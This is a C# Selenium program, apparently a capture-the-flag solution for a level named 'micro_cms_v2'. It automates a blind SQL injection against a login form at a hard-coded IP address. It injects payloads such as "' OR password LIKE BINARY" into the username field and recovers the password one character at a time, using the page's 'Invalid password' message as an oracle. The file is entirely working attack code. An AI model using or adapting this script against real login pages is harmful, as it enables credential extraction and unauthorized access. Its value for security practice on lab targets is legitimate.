using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Linq;

namespace micro_cms_v2
{
    class Program
    {
        static void Main(string[] args)
        {
            var webDriver = LaunchBrowser();

            int pwdLength = 8;
            char[] pwd = new char[pwdLength];
            pwd = pwd.Select(x => '_').ToArray();
            
            int userLength = 9;
            char[] user = new char[userLength];
            user = user.Select(x => '_').ToArray();

            // char[] dict = { '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '`', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', '~', ']', '^', '_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~' };
            char[] dict = { 'A', 'a', 'B', 'b', 'C', 'c', 'D', 'd', 'E', 'e', 'F', 'f', 'G', 'g', 'H', 'h', 'I', 'i', 'J', 'j', 'K', 'k', 'L', 'l', 'M', 'm', 'N', 'n', 'O', 'o', 'P', 'p', 'Q', 'q', 'R', 'r', 'S', 's', 'T', 't', 'U', 'u', 'V', 'v', 'W', 'w', 'X', 'x', 'Y', 'y', 'Z', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '#', '$', '&', '(', ')', '*', '+', ',', '-', '.', '/', ':', '<', '=', '>', '?', '`', '@', '[', '\\', '~', ']', '^', '{', '|', '}', '~' };
            try
            {
                webDriver.Url = "http://35.227.24.107/5875953fb3/login";

                for(int i = 0 ; i < pwd.Length ; i++) {
                    foreach(var c in dict) {
                        user[i] = c;
                        pwd[i] = c;
                        
                        var input = webDriver.FindElement(By.Name("username"));
                        // string query = $"' OR username LIKE \"{new String(user)}\";";
                        string query = $"' OR password LIKE BINARY \"{new String(pwd)}\";";
                        Console.WriteLine(query);
                        input.SendKeys(query);
                        
                        webDriver.FindElement(By.XPath("/html/body/form/input[3]")).Click();

                        if(webDriver.FindElement(By.XPath("/html/body/form/div")).Text == "Invalid password")
                            break;
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while executing automation");
                Console.WriteLine(ex.ToString());
            }
            finally
            {
                webDriver.Quit();
            }
        }

        static IWebDriver LaunchBrowser()
        {
            var options = new ChromeOptions();
            options.AddArgument("--start-maximized");
            options.AddArgument("--disable-notifications");
            options.AddArgument("--no-sandbox");

            var driverService = ChromeDriverService.CreateDefaultService("/snap/bin", "chromium.chromedriver");
            var driver = new ChromeDriver(driverService, options);
            return driver;
        }
    }
}
